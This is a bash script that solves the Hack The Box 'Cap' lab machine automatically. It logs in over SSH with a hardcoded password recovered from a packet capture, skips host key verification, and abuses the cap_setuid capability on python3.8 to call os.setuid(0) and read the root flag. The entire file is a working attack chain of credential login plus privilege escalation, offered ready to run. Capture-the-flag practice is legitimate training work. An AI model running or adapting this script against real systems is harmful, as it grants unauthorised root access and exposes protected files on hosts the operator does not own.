#!/usr/bin/env bash
#
# cap-flags.sh — retrieve user and root flags from HTB Cap
#
# Chains the known foothold (SSH creds recovered from the pcap) with the
# cap_setuid privesc on /usr/bin/python3.8. Both flags are pulled over SSH;
# no interactive shell is needed.
#
# Usage:   ./cap-flags.sh [target-ip]
# Example: ./cap-flags.sh 10.129.134.144
# Requires: sshpass   (Arch/Omarchy:  sudo pacman -S sshpass)

set -euo pipefail

TARGET="${1:-10.129.134.144}"
REMOTE_USER="nathan"
REMOTE_PASS='Buck3tH4TF0RM3!'

# Non-interactive SSH: don't prompt on host key, don't pollute known_hosts,
# fail fast instead of hanging.
SSH_OPTS=(
  -o StrictHostKeyChecking=no
  -o UserKnownHostsFile=/dev/null
  -o ConnectTimeout=10
)

run() { sshpass -p "$REMOTE_PASS" ssh "${SSH_OPTS[@]}" "$REMOTE_USER@$TARGET" "$1" 2>/dev/null; }

echo "[*] Target: $TARGET"

# --- User flag: read it directly as nathan ---
echo "[*] Reading user flag..."
USER_FLAG="$(run 'cat ~/user.txt')"
echo "[+] user.txt: ${USER_FLAG:-<not found>}"

# --- Root flag: abuse cap_setuid on python3.8 to read /root/root.txt ---
# python3.8 carries cap_setuid+ep, so os.setuid(0) succeeds; we then read the
# file in the same process — no shell escalation required.
echo "[*] Escalating via cap_setuid on python3.8..."
ROOT_FLAG="$(run '/usr/bin/python3.8 -c "import os; os.setuid(0); print(open(\"/root/root.txt\").read().strip())"')"
echo "[+] root.txt: ${ROOT_FLAG:-<not found>}"
